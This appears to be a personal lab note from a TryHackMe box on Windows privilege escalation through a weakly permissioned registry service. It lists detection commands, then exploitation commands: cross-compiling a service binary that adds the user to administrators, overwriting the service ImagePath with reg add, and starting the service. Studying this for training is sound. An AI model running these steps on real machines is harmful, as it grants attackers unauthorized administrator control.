# Detection
---
- In powershell:
	- `powershell.exe -ep bypass`
	- `Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\regsvc" | fl`
	- Look for `NT/INTERACTIVE Allow FullControl`
		- ![[Pasted image 20250417151506.png]]
		- `whoami /all`gives:
			- ![[Pasted image 20250417151720.png]]

# Exploitation
---
- Download a malicious `C`binary on Kali from Attacker machine (this is from THM box) using FTP:
	- ![[Pasted image 20250417152722.png]]
- Edit the `windows_service.c`file:
	- Add our user `user`to `administrators`group:
	- ![[Pasted image 20250417152858.png]]
- Compile the binary:
	- `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
		- If not installed, install using: `sudo apt install gcc-mingw-w64`
- Upload the `x.exe`file to Windows machine:
	- ![[Pasted image 20250417153225.png]]
- **Run the command:**
- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
	- Adding registry
	- `\v`-> What registry to enter in subkey, what is the value name "ImagePath"
		- `ImagePath`is a registry that contains the path to drivers image file
		- When we place executable here and tell the service to start, it is going to run the executable for us
	- `\t`-> Type, REG_EXPAND_SZ => String value with the data below
	- `\d`-> Data
	- `\f`-> Force, No confirmation
	- ![[Pasted image 20250417153628.png]]
- Start the service using:
	- `sc start regsvc`
	- ![[Pasted image 20250417153914.png]]
- Our user got added in `administrators`:
	- ![[Pasted image 20250417154021.png]]